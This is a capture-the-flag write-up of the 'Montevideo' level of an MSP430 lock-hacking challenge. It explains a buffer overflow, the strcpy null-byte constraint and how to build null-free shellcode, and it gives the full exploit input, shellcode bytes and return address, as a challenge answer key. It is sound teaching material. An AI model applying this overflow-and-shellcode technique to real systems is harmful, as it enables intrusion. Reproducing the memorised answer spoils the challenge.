## 9. Montevideo

**Objective:** Buffer Overflow and Shellcode

Again, just like the last challenge, this program is vulnerable to a buffer overflow. We can write 48 bytes to the buffer instead of just 16 as implied. 

```
4508:  3e40 3000      mov	#0x30, r14
450c:  3f40 0024      mov	#0x2400, r15
4510:  b012 a045      call	#0x45a0 <getsn>
```

If we submit a 48 character pattern string and break at the end of main, we find that sp is pointing at the 17th offset. So, we can control program flow. 

Just like in the last challenge, we will need to write some shellcode. There is no useful function for us to jump to.

Unlike the last challenge, our input string is being copied to another location in  memory using **strcpy**. According to the manpage, this function copies a string from one location to another. It terminates when it encounters a null byte (00).

```
4514:  3e40 0024      mov	#0x2400, r14
4518:  0f41           mov	sp, r15
451a:  b012 dc45      call	#0x45dc <strcpy>
```

In addition, our original string that we enter is cleared from memory, so we have no way of accessing it. This is done with the **memset** call.

```
4524:  3f40 0024      mov	#0x2400, r15
4528:  b012 f045      call	#0x45f0 <memset>
```

In order to pass this objective, we need to write shellcode to call INT with the 0x7f argument. The important thing is that, this time, we must write shellcode that contains no null bytes so it is fully copied by strcpy to a location in memory that we can access after main returns.

In order for the lock to open, we need to push the argument 0x7f onto the stack and then call INT. If we push 0x7f directly, we end up with null bytes in our shellcode:

```
30 12 7f **00** b0 12 32 45
```

However, an easy workaround is to use the registers to do some hexadecimal math that has the result 0x7f in the lower byte and then push the register.

Instructions
```
mov #0xC15d, r15
sub #0xC0DE, r15
push r15
call #0x454c <INT>
```

Assembled opcodes:
```
3f 40 5d c1 3f 80 de c0 0f 12 b0 12 4c 45
```

Now we have no null bytes.

We notice that the start of our string lives at address 0x43ee. We can craft our input string as the following:

- shellcode (14 bytes)
- 2 bytes of junk padding
- ee43

**Flag:** **3f405dc13f80dec00f12b0124c45**4141**ee43** 
